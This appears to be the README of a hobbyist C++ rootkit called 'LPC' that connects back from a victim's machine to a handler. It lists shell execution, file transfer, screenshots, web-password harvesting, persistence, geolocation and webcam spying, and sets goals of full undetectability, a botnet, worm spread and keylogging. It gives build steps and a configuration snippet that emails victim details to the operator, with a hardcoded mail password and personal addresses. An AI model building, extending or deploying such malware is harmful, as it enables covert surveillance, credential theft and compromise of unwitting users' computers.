# LPC
## Le petit cheval
Rootkit written in C++ based on socket connection.

2 Executables : The handler and the payload. 
When the payload is executed on the computer's victim, it will try to connect at a special IP:PORT toward the handler.
If it's succesfull you can run several scripts (upload file, download file, screenshot, run shell command, enum web password, put persistence, get external IP, geolocalyze the victim etc...) 

## Final goals :
- Fully undetectable
- Perform stable worked and undetectable scripts
- Manage several clients and create a stable botnet
- Executable must be light
- Worm function
- Keylogger mode

## Getting Started
These instructions will get you a copy of the project up and running on your local machine 

### Prerequisites
The Project was made with Visual Studio 2017 so it's recommended to use it, but you can debug and compile the projet with g++. 
First you need to install Visual Studio at least 2017 (Community or Pro)
Then install all the C++ basics tools in Visual Installer (g++, ...)
**Please put x64 and Debug mode to your Visual Studio project**
You will need library : 
- [opencv](https://opencv.org/releases/) to spy the webcam
And you will need to add the bin folder to the Path of Windows (so VC++ can access to it everywhere) 
In Project properties : 
- Add additional directory (put the path of the include open_cv folder)
- Add lib to Visual c++ Linker (add the path of the lib folder of open_cv)
- Add Input --> additional file (opencv_world410d.lib if you are using the debug mode)

### How to build the project 
Before building the project, to communicate with the handler you need to put the external IP address of the machine that will be running the handler [Handler](https://github.com/Mathugo/LPC_handler).
You also need to put all your email informations so that it can send a mail toward your email with informations (location, IP, sysinfo..)  
It's located in the main function() --> [LPC.cpp](https://github.com/Mathugo/LPC/blob/master/LPC/LPC.cpp)
```
int main()
{
	// ----------- MAIL SETTING --------------------
	const std::string smtp = "smtp.gmail.com:587"; Exemple
	const std::string sender_mail = "LPCEmailZ@gmail.com";
	const std::string sender_name = "LPC";
	const std::string password = "lpc12345";
	const std::string rcpt_name = "Hugo";
	const std::string mail_rcpt = "hugo.mathh@gmail.com";
	// ------------ IP ------------------
	const char addr[] = "HANDLER IP ADDRESS"; 
	const unsigned short port = HANDLER_PORT;
```

## Running the tests
No tests are plannified for the moment

## Contributors
* **Lucien Leseigle**

## Authors
* **Hugo Math**

## Dependency
* **curl.exe** To send mail
* **open_cv** To spy webcam
